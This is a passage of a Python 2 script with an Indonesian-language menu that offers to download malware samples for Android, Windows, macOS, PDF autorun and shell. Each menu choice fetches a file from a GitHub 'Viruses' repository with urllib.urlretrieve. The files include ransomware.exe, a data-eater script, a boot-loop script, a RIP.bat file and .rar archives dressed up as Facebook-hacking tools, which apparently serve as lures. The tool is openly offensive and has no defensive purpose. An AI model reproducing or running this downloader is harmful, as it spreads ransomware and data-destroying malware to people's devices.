            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
        elif again == 'Y' or again == 'y':
            windows()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
    elif mana in ('6', '06'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/cmd.bat', 'cmd.bat')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
        elif again == 'Y' or again == 'y':
            windows()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
    elif mana in ('7', '07'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/capslock.vbs', 'capslock.vbs')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
        elif again == 'Y' or again == 'y':
            windows()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
    elif mana in ('8', '08'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/alay.vbs', 'alay.vbs')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
        elif again == 'Y' or again == 'y':
            windows()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
    elif mana in ('9', '09'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/ransomeware.exe', 'ransomware.exe')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
        elif again == 'Y' or again == 'y':
            windows()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
    elif mana in ('10',):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/RIP.bat', 'rip.bat')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
        elif again == 'Y' or again == 'y':
            windows()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            windows()
    elif mana in ('B', 'b'):
        menu()
    elif mana in ('E', 'e'):
        keluar()
    else:
        print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
        time.sleep(1)
        pilih_windows()


def macosx():
    os.system('clear')
    print logo
    print '  %s(%s01%s)%s TRINOIDS.app' % (putih, cyan, putih, hijau)
    print '  %s(%s02%s)%s NOTHING.app' % (putih, cyan, putih, hijau)
    print batas
    print men
    print batas
    pilih_macosx()


def pilih_macosx():
    mana = raw_input('\x1b[37m(\x1b[36m!\x1b[37m)\x1b[32m input@rzky\x1b[31m =>\x1b[33;1m ')
    if mana == '':
        print '%s(%s!%s)%s Invalid Menu' % (putih, merah, putih, merah)
        pilih_macosx()
    elif mana in ('1', '01'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/trinoids.app', 'trinoids.app')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            macosx()
        elif again == 'Y' or again == 'y':
            macosx()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            macosx()
    elif mana in ('2', '02'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/nothing.app', 'nothing.bat')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            macosx()
        elif again == 'Y' or again == 'y':
            macosx()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            macosx()
    elif mana in ('B', 'b'):
        menu()
    elif mana in ('E', 'e'):
        keluar()
    else:
        print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
        time.sleep(1)
        pilih_macosx()


def pdfautorun():
    os.system('clear')
    print logo
    print '  %s(%s01%s)%s AUTO HACK FACEBOOK %s(%sex%s: %srar%s)' % (putih, cyan, putih, hijau, putih, cyan, merah, hijau, putih)
    print '  %s(%s02%s)%s HACK FACEBOOK      %s(%sex%s: %srar%s)' % (putih, cyan, putih, hijau, putih, cyan, merah, hijau, putih)
    print batas
    print men
    print batas
    pilih_pdfautorun()


def pilih_pdfautorun():
    mana = raw_input('\x1b[37m(\x1b[36m!\x1b[37m)\x1b[32m input@rzky\x1b[31m =>\x1b[33;1m ')
    if mana == '':
        print '%s(%s!%s)%s Invalid Menu' % (putih, merah, putih, merah)
        pilih_pdfautorun()
    elif mana in ('1', '01'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/howtohackfb.rar', 'autohackfb.rar')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            pdfautorun()
        elif again == 'Y' or again == 'y':
            pdfautorun()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            pdfautorun()
    elif mana in ('2', '02'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/hackfacebook.rar', 'hackfb.rar')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            pdfautorun()
        elif again == 'Y' or again == 'y':
            pdfautorun()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            pdfautorun()
    elif mana in ('B', 'b'):
        menu()
    elif mana in ('E', 'e'):
        keluar()
    else:
        print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
        time.sleep(1)
        pilih_pdfautorun()


def shell():
    os.system('clear')
    print logo
    print '  %s(%s01%s)%s DATA-EATER.sh' % (putih, cyan, putih, hijau)
    print '  %s(%s02%s)%s BOOTLOP.sh' % (putih, cyan, putih, hijau)
    print batas
    print men
    print batas
    pilih_shell()


def pilih_shell():
    mana = raw_input('\x1b[37m(\x1b[36m!\x1b[37m)\x1b[32m input@rzky\x1b[31m =>\x1b[33;1m ')
    if mana == '':
        print '%s(%s!%s)%s Invalid Menu' % (putih, merah, putih, merah)
        pilih_shell()
    elif mana in ('1', '01'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/data-eater.sh', 'data-eater.sh')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            shell()
        elif again == 'Y' or again == 'y':
            shell()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            shell()
    elif mana in ('2', '02'):
        urllib.urlretrieve('https://github.com/Ractomes/Viruses/blob/master/samples/bootloop.sh', 'bootlop.sh')
        load('\x1b[37m(\x1b[36m-\x1b[37m) \x1b[37mSedang Mengunduh \x1b[32m')
        print '\n\x1b[37m(\x1b[32m\xe2\x9c\x93\x1b[37m) \x1b[37mDone\x1b[36m ....'
        again = raw_input('\x1b[37m(\x1b[36m?\x1b[37m) \x1b[37mMau Mencoba Lagi? \x1b[37m[\x1b[36mY\x1b[32m/\x1b[36mT\x1b[37m] \x1b[31m=>\x1b[33;1m ')
        if again == '':
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            shell()
        elif again == 'Y' or again == 'y':
            shell()
        elif again == 'T' or again == 't':
            print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
            sys.exit()
        else:
            print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
            time.sleep(1)
            shell()
    elif mana in ('B', 'b'):
        menu()
    elif mana in ('E', 'e'):
        keluar()
    else:
        print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
        time.sleep(1)
        pilih_shell()


def menu():
    os.system('clear')
    print logo
    print '%s (%s01%s)%s VIRUS ANDROID' % (putih, merah, putih, hijau)
    print '%s (%s02%s)%s VIRUS WINDOWS' % (putih, merah, putih, hijau)
    print '%s (%s03%s)%s VIRUS MACOSX' % (putih, merah, putih, hijau)
    print '%s (%s04%s)%s PDF AUTORUN PC' % (putih, merah, putih, hijau)
    print '%s (%s05%s)%s SHELL VIRUS' % (putih, merah, putih, hijau)
    print '%s (%s00%s)%s EXIT' % (putih, merah, putih, hijau)
    print batas
    pilih_menu()


def pilih_menu():
    mana = raw_input('\x1b[37m(\x1b[36m!\x1b[37m)\x1b[32m input@rzky\x1b[31m =>\x1b[33;1m ')
    if mana == '':
        print '%s(%s!%s)%s Invalid Menu' % (putih, merah, putih, merah)
        pilih_menu()
    elif mana in ('0', '00'):
        print "%s(%s=%s) %sthanks%s,%s follow%s:%s '%sriski_1504%s'" % (putih, cyan, putih, putih, kuning, putih, merah, kuning, hijau, kuning)
        time.sleep(1)
        os.system('xdg-open https://www.instagram.com/riski_1504')
        sys.exit()
    elif mana in ('1', '01'):
        android()
    elif mana in ('2', '02'):
        windows()
    elif mana in ('3', '03'):
        macosx()
    elif mana in ('4', '04'):
        pdfautorun()
    elif mana in ('5', '05'):
        shell()
    else:
        print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
        time.sleep(1)
        pilih_menu()

menu()
